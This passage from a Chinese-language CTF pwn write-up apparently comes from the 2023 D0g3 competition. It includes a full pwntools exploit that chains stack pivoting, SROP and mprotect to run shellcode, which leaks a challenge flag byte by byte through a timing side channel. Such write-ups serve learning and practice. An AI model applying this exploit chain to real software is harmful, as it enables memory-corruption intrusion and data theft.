+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">10</span> <span class="comment"># mprotect系统调用号</span></span><br><span class="line">frame.rbx = <span class="number">0</span> </span><br><span class="line">frame.rdi = <span class="number">0x404000</span> <span class="comment"># 内存页地址，保证0x1000对齐</span></span><br><span class="line">frame.rsi = <span class="number">4096</span> <span class="comment"># 内存页的大小</span></span><br><span class="line">frame.rdx = <span class="number">7</span> <span class="comment"># 可读可写可执行</span></span><br><span class="line">frame.rip = sys_ret</span><br><span class="line">frame.rsp = shell_temp - <span class="number">8</span></span><br></pre></td></tr></table></figure>
+<p>这里追踪shellcode的地址花了好半天才写对，如果我们把shellcode布在栈上，就需要在完成<code>mprtect</code>之后把pc控到栈上。</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行完<span class="function"><span class="title">sigereturn</span> ： rsp -&gt;</span> shell_temp + <span class="number">8</span></span><br><span class="line"><span class="function"><span class="title">ret</span> ; pc = shell_temp + 8 -&gt;</span> shellcode</span><br></pre></td></tr></table></figure>
+<p><code>syscall</code>之后，已执行<code>pop rbp</code>, <code>ret</code>前，栈结构（我们保证通过srop恢复栈顶）</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">            ----------------</span><br><span class="line">rsp  ---&gt;   |<span class="string">     rsp+8    </span>|<span class="string"> ----- </span></span><br><span class="line"><span class="string">            ----------------     </span>|</span><br><span class="line">            |<span class="string">   mov bl, .. </span>|<span class="string"> &lt;---</span>|<span class="string">    </span></span><br><span class="line"><span class="string">            ----------------     </span></span><br><span class="line"><span class="string">            </span>|<span class="string">   mov al, {} </span>|<span class="string">     </span></span><br><span class="line"><span class="string">            ----------------     </span></span><br><span class="line"><span class="string">            </span>|<span class="string">   cmp bl, al </span>|<span class="string"> </span></span><br></pre></td></tr></table></figure>
+<p><code>ret</code>之后，<code>pc</code>和<code>rsp</code>指向同一个位置</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">          ----------------</span><br><span class="line">          |     <span class="built_in">rsp</span>-<span class="number">8</span>    | </span><br><span class="line">          ----------------     </span><br><span class="line">pc  --&gt;   |   <span class="keyword">mov</span> <span class="built_in">bl</span>, .. |   &lt;-- <span class="built_in">rsp</span></span><br><span class="line">          ----------------     </span><br><span class="line">          |   <span class="keyword">mov</span> <span class="built_in">al</span>, {} |     </span><br><span class="line">          ----------------     </span><br><span class="line">          |   <span class="keyword">cmp</span> <span class="built_in">bl</span>, <span class="built_in">al</span> | </span><br></pre></td></tr></table></figure>
+<p>这样就可以执行栈啦~</p>
+<p>不会写自动化的脚本，只能比较笨的从头到尾一个个试</p>
+<p>还好从上一题得到flag的字符集只有<code>[0-9a-f\-]</code>，所以还好~</p>
+<p>每次手动更新index的值，代表flag的第几个字符，<code>char_set</code>我们自己定义</p>
+<p>EXP如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./chall"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">p = process(<span class="string">"./chall"</span>)</span><br><span class="line"></span><br><span class="line">flag_len = <span class="number">0x100</span></span><br><span class="line">flag_addr = <span class="number">0x404068</span></span><br><span class="line">flag_name_addr = <span class="number">0x404060</span></span><br><span class="line">sys_ret = <span class="number">0x40118A</span></span><br><span class="line">pop_rax = <span class="number">0x401193</span></span><br><span class="line">leave_ret = <span class="number">0x4014d4</span></span><br><span class="line">main_ret = <span class="number">0x4014A9</span></span><br><span class="line">shell = <span class="number">0x404060</span> + flag_len</span><br><span class="line">ret_addr = <span class="number">0x40118e</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"flag"</span>.ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>) + <span class="string">b"\x00"</span> * (<span class="number">0x100</span> - <span class="number">8</span>) + <span class="string">b"a"</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">2</span></span><br><span class="line">frame.rdi = flag_name_addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = sys_ret</span><br><span class="line">frame.rsp = shell + <span class="number">16</span> + <span class="number">8</span> + <span class="built_in">len</span>(frame) - <span class="number">8</span></span><br><span class="line"></span><br><span class="line">shell_temp = shell + <span class="number">16</span> + <span class="number">8</span> + <span class="built_in">len</span>(frame)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rax) + p64(sys_ret) + <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">shell_temp += <span class="number">16</span> + <span class="built_in">len</span>(frame)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0</span></span><br><span class="line">frame.rbx = <span class="number">0</span></span><br><span class="line">frame.rdi = <span class="number">3</span></span><br><span class="line">frame.rsi = flag_addr</span><br><span class="line">frame.rdx = <span class="number">0x100</span></span><br><span class="line">frame.rip = sys_ret</span><br><span class="line">frame.rsp = shell_temp - <span class="number">8</span></span><br><span class="line"></span><br><span class="line">while_shell = <span class="string">"""</span></span><br><span class="line"><span class="string">    mov bl, byte ptr [{}]</span></span><br><span class="line"><span class="string">    cmp bl, {}</span></span><br><span class="line"><span class="string">    jz $-0x3</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rax) + p64(sys_ret) + <span class="built_in">bytes</span>(frame)</span><br><span class="line">shell_temp += <span class="number">16</span> + <span class="built_in">len</span>(frame)</span><br><span class="line"></span><br><span class="line"><span class="comment"># mprotect</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">10</span></span><br><span class="line">frame.rbx = <span class="number">0</span></span><br><span class="line">frame.rdi = <span class="number">0x404000</span></span><br><span class="line">frame.rsi = <span class="number">4096</span></span><br><span class="line">frame.rdx = <span class="number">7</span></span><br><span class="line">frame.rip = sys_ret</span><br><span class="line">frame.rsp = shell_temp - <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rax) + p64(sys_ret) + <span class="built_in">bytes</span>(frame) + p64(shell_temp + <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = <span class="string">"-0123456789abcdef"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span> <span class="comment"># 比赛来不及写自动化脚本，只能手动爆破。。每次死循环之后记下当前位的flag然后index++</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="comment"># p = remote("47.108.206.43", 42211)</span></span><br><span class="line">        p = process(<span class="string">"./chall"</span>)</span><br><span class="line">       </span><br><span class="line">		p.recv()</span><br><span class="line">        payload3 = payload + asm(while_shell.<span class="built_in">format</span>(index + flag_addr, <span class="built_in">ord</span>(s[i])))</span><br><span class="line">        p.sendline(payload3)</span><br><span class="line">        payload2 = <span class="string">b"A"</span> * (<span class="number">0x2a</span>) + p64(shell) + p64(leave_ret)</span><br><span class="line">        p.recv()</span><br><span class="line">        p.info(<span class="string">"current {}"</span>.<span class="built_in">format</span>((s[i])))</span><br><span class="line"></span><br><span class="line">        start = time.time()</span><br><span class="line">        p.sendline(payload2)</span><br><span class="line">        p.recvall()</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="built_in">print</span>(end - start)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag{d69c2244-a17b-11ee-844d-00163e0447d0}</span></span><br></pre></td></tr></table></figure>
+<p>爆破~</p>
+<p><img src="/2023/12/23/2023D0g3Pwn/480b8c26497340e703f0eb61ade26c5.png"></p>
+<p>看在哪里卡死</p>
+<p><img src="/2023/12/23/2023D0g3Pwn/image-20231224013629508.png"></p>
+<p>则<code>flag[index] = 'd'</code></p>
+<p>逐位爆破，得到flag<code>flag{d69c2244-a17b-11ee-844d-00163e0447d0}</code></p>
+<p>说起来也是心累，真得爱护容器吧，做个b题容器崩了三四次，关键是flag是随机的，每次开容器flag都不一样，还得从头开始爆破，破到一半容器又坏了.....</p>
+<p>平常练习的时候考点都比较单一叭，要不就是栈迁移，要不就是Srop</p>
+<p>很少见到像今天比赛这种 栈迁移+Srop+mprotect+shellcode+..... 还是缺少做题经验叭</p>
+<p>第三题不会....还是菜，继续练~</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/12/20/Computer-System-II-Lab-6-%EF%BC%9A%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Computer System II Lab 6 ：综合实验</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2023 晚栀wingee~
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+</html>
